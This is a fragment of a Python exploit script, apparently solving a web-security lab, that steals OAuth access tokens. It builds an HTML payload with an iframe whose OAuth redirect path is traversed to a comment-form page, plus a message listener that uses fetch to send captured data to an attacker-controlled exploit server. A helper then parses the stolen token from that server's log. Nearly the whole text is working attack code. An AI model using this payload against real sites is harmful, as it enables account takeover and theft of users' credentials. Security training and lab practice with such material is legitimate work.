...
def extract_access_token(s, exploit_url, path):
    ...
    r = s.get(target_url)
    access_token = r.text.split('access_token%3D')[-1].split('%26')[0]
    return access_token
...
def main():
    ...
    payload = f"""
    <iframe src="{oauth_url}{oauth_path}"></iframe>
    <script>
        window.addEventListener('message', function(e) {{
            fetch('{exploit_url}/log?data=' + encodeURIComponent(e.data.data));
        }}, false);
    </script>
    """
    payload = payload.replace('/oauth-callback', f'/oauth-callback/../post/comment/comment-form')
